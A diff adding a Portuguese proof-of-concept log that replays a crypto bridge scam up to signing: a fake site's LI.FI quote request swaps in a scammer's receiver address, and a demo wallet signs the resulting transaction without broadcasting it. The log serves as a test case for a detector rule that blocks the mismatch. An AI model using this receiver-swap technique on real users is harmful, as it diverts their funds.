@@ -1,0 +1,44 @@
+============================================================================
+PoC CAMADA 3 — golpe replicado até a assinatura | SEM broadcast | SEM vítima
+============================================================================
+
+[P1] Carteira vítima-DEMO gerada (descartável, saldo ZERO):
+     endereço:  0x9458a3Fe46FF57e698b9352F3D568e3f3c376cea
+     saldo:     0.0 ETH (confirmado on-chain)
+
+[P2] REQUEST do site-falso à API oficial (o único campo do crime):
+     GET li.quest/v1/quote?fromChain=42161&toChain=8453&fromAmount=300000000&fromAddress=0x9458a3Fe46FF57e698b9352F3D568e3f3c376cea
+     &receiver=0xDeaDBeef00000000000000000000000000000000   <-- CARTEIRA DO GOLPISTA (dummy)
+
+     API respondeu (HTTP 200, sem restrição alguma):
+     executor:  0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE  (LI.FI Diamond OFICIAL)
+     rota:      polymerStandard
+     toAddress exibido na resposta (display): 0x9458a3Fe46FF57e698b9352F3D568e3f3c376cea
+     ^-- engano: a resposta mostra o endereço da vítima, mas o
+         compromisso no calldata aponta para 0xDeaDBeef00000000000000000000000000000000
+
+[P3] Transação montada (exatamente o que o pop-up da carteira mostraria):
+     nonce=0 | gas=3374500 | chainId=42161
+     data: 0x17917a4e00000000000000000000000000000000000000000000000000... (1316 bytes)
+
+[P4] ASSINADA pela chave da vítima-demo (EIP-155):
+     v: 84358
+     r: 0x7f95b8531c4a410e9447154ab63c49d4adad3ee41b5938e8936bfe59c051314b
+     s: 0x0f93718b4a43ca415ee81b0204f93ffd4c597ef0c80d457524a673402960fe32
+     raw tx: 0xf9058d808401312d0083337da4941231deb6f5749ef6ce6943a275a1d3e7486f4eae80b9052417...
+              ...(1424 bytes) — NÃO TRANSMITIDA
+
+[P5] Verificação da assinatura (ecrecover local): 0x9458a3Fe46FF57e698b9352F3D568e3f3c376cea
+     assinante recupera para a vítima-demo: True  ← assinatura é CRIPTOGRAFICAMENTE válida
+
+[P6] O QUE CADA UM VÊ NESTA MESMA TRANSAÇÃO:
+     Explorador/simulador: 'bridge LI.FI legítimo, contrato rotulado'
+     ZEUS GUARD/INV9:      'receiver do request (0xDeaDBeef..) != carteira'
+                            conectada (0x9458a3Fe..) → BLOQUEAR'
+
+============================================================================
+FIM DA PROVA. Nada foi transmitido. A carteira-demo não tem ETH:
+esta transação NUNCA poderia executar. O artefato é inerte — vale como
+evidência de engenharia (assinatura válida, pipeline do golpe completo)
+e como caso de teste do INV9. Sem vítimas. Sem broadcast. Sem crime.
+============================================================================
